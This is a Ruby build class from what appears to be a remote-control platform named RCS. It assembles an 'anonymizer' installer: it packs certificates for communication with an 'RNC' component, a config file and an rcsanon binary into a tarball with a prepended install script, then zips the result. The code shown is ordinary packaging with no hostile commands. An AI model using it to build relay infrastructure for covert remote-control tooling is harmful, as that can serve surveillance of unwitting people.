#
# Anonymizer installer creation
#

# from RCS::Common
require 'rcs-common/trace'

require 'archive/tar/minitar'

module RCS
module DB

class BuildAnon < Build
  include Archive::Tar

  def initialize
    super
    @platform = 'anon'
  end

  def melt(params)
    trace :debug, "Build: melt #{params}"

    # take the files needed for the communication with RNC
    FileUtils.cp Config.instance.cert('rcs.pem'), path('rcsanon/etc/rcs.pem')
    FileUtils.cp Config.instance.cert('rcs-network.sig'), path('rcsanon/etc/rcs-network.sig')

    # create the installer tar gz
    begin
      gz = Zlib::GzipWriter.new(File.open(path('install.tar.gz'), 'wb'))
      output = Minitar::Output.new(gz)

      h = {name: path('rcsanon/etc/rcsanon.conf'), as: 'rcsanon/etc/rcsanon.conf'}
      Minitar::pack_file(h, output)

      h = {name: path('rcsanon/etc/rcs.pem'), as: 'rcsanon/etc/rcs.pem'}
      Minitar::pack_file(h, output)

      h = {name: path('rcsanon/etc/rcs-network.sig'), as: 'rcsanon/etc/rcs-network.sig'}
      Minitar::pack_file(h, output)

      h = {name: path('rcsanon/sbin/rcsanon'), as: 'rcsanon/sbin/rcsanon', mode: 0755}
      Minitar::pack_file(h, output)

      h = {name: path('rcsanon/tmp/errlog'), as: 'rcsanon/tmp/errlog'}
      Minitar::pack_file(h, output)

    ensure
      output.close
    end

    # prepend the install script
    sh = File.binread(path('install.sh'))
    bin = File.binread(path('install.tar.gz'))

    File.open(path('anon-install.sh'), 'wb') do |f|
      f.write sh
      f.write bin
    end

    @outputs = ['anon-install.sh']
  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
      @outputs.each do |out|
        z.file.open(out, "w") { |f| f.write File.open(path(out), 'rb') {|f| f.read} }
      end
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']

  end

end

end #DB::
end #RCS::
